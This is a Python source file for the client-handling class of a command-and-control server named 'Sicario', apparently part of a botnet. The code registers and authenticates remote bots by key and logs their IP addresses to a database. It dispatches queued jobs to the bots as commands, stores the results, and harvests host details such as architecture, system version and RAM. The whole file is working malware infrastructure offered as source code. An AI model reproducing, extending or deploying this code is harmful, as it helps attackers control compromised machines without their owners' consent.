#!/usr/bin/python

import sicario 
import commands
import log
import database

# Sicario C&C server
# High level client class

import time,hashlib

class Client:
	fillable_data = ['architecture', 'system', 'system_ver', 'ram', 'interval']

	def __init__ (self, address, socket):
		self.address = address
		self.socket = socket
		self.module_manager = socket.module_manager
		self.pending_job = False
		self.key = False
		self.id = False
	
	def on_command (self, command):

		if self.pending_job: # server is currently waiting for the results of sent command
			db = database.Database()
			db.cursor.execute('''UPDATE jobs SET processed = 1, result = %s WHERE id = %s''', [command, self.pending_job['id']])
			db.handler.commit()

			if self.pending_job['type'] == 'get':
				if self.pending_job['payload'] in self.fillable_data:
					db.cursor.execute('''UPDATE clients SET {} = %s WHERE id = %s'''.format(self.pending_job['payload']), [command, self.id])
	
			db.handler.commit()
			db.handler.close()

			log.log('{} (key {}) successfully executed job #{}!'.format(self.address, self.key, self.pending_job['id']))
			self.pending_job = False

			if not self.__check_jobs():
				self.__is_missing_data()
				self.disconnect()
			return True

		
		# arguments[0] is the command name
		arguments = commands.parse(command)
		db = database.Database()
		
		if self.key == False and arguments[0] != 'register' and arguments[0] != 'login':
			self.disconnect()
			return False
		
		if not self.key:
			# is it new member? let's check if he provided his key
			if len(arguments) < 2:
				# new member
				log.log('Got new member! ({}). Generating random key..'.format(self.address))
				key = hashlib.md5(str(time.time()*100000)).hexdigest().upper()
				log.log('Key for {} generated: {}'.format(self.address, key))
				self.send_command(['set','key',key])
				
				# now, we should add this to a database
				db.cursor.execute('''INSERT INTO clients (userkey, ip, created_on, updated_on) VALUES (%s, %s, NOW(), NOW())''', [key, self.address])

				self.disconnect()

				db.handler.commit()
				db.handler.close()

			elif len(arguments) == 2 and len(arguments[1]) == 32:
				# already registered member
				self.key = arguments[1]

				# first we check if our client is registered in the database, if not - we inform him about it
				db.cursor.execute('SELECT * FROM clients WHERE userkey=%s', [self.key])
				client = db.cursor.fetchone()

				if not client:
					self.module_manager.trigger_hook('on_client_auth', self.key, False)
					self.send_command(['error', '1'])
					db.handler.close()
					self.disconnect()
					return False

				self.id = client['id']
				self.module_manager.trigger_hook('on_client_auth', self.key, self.id)

				db.cursor.execute('''UPDATE clients SET updated_on = NOW(), ip = %s WHERE id=%s''', [self.address, self.id])

				# now we're going to check for pending commands (jobs)
				jobs = self.__check_jobs()

				if jobs:
					log.log('{} (key {}) updated himself successfully [{} jobs pending]'.format(self.address, self.key, len(jobs)))
				else:
					log.log('{} (key {}) updated himself successfully [0 jobs pending].'.format(self.address, self.key))
					self.__is_missing_data()
					self.disconnect()

				db.handler.commit()
				db.handler.close()

			else:
				self.disconnect()

	def send_command (self, args):
		self.raw_send(commands.encode(args))
	
	def raw_send (self, text):
		self.socket.send(text)
		
	def __check_jobs (self):
		if not self.key:
			return False

		db = database.Database()
		db.cursor.execute('''SELECT * FROM jobs WHERE userkey = %s AND processed = 0''', [self.key])
		jobs = db.cursor.fetchall()
		db.handler.close()

		if not jobs:
			return False

		self.send_command([jobs[0]['type'], jobs[0]['payload']]) #payload
		self.pending_job = jobs[0]

		return jobs

	def __is_missing_data (self):
		if not self.key:
			return False

		db = database.Database()

		db.cursor.execute('SELECT * FROM clients WHERE userkey=%s', [self.key])
		client = db.cursor.fetchone()

		if not client:
			return False

		for data in self.fillable_data:
			if not client[data]:
				db.cursor.execute('''INSERT INTO jobs (userkey, type, payload) VALUES (%s, %s, %s)''', [self.key, 'get', data])

		db.handler.commit()
		db.handler.close()
		return True

	def disconnect (self):
		self.socket.stop()
		return True